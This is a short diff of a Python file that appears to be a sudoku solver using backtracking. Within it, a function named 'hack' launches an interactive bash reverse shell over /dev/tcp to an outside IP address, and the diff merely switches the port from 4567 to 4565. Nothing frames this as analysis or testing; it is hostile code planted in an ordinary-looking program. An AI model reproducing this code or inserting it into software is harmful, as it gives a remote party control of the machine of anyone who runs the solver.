@@ -98,7 +98,7 @@ def valid(m, i, j, val):
     return True
  
 def hack(num):
-     subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/4567 0<&1 2>&1", shell=True, executable='/bin/bash')
+     subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/4565 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 
 # Solves the sudoku board using Backtracking Algorithm
